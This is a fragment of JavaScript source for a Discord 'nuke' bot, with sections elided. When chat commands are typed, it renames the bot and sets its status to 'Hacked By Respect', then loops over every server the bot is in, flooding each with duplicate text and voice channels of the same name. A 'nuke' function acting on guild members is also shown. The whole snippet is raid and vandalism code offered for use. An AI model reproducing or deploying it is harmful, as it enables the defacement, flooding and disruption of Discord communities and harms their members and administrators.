...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked By Respect")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked By Respect`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked By Respect', 'text');
m.createChannel('Hacked By Respect', 'text');
m.createChannel('Hacked By Respect', 'text');
m.createChannel('Hacked By Respect', 'text');
m.createChannel('Hacked By Respect', 'text');
...
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked By Respect', 'voice');
m.createChannel('Hacked By Respect', 'voice');
m.createChannel('Hacked By Respect', 'voice');
m.createChannel('Hacked By Respect', 'voice');
m.createChannel('Hacked By Respect', 'voice');
...
async function nuke(guild) {
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked By Respect', 'text');
 
      await guild.createChannel('Hacked By Respect', 'voice');
